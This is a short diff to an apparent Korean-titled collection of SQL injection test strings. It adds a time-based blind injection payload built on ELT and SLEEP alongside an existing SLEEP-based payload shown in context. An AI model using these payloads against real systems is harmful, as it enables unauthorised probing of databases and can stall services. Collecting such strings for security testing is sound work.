@@ -27,6 +27,9 @@ SqIinjection 테스트 코드
 '||(SELECT 0x615a636e FROM DUAL WHERE 7192=7192 AND (SELECT 4865 FROM (SELECT(SLEEP(5)))VDbe))||'
 ```
 
+```
+`=`1` AND ELT(1337=1337 AND ELT(1337=1337,SLEEP(5*5)))|[1
+```
 
 OR x=y     
 
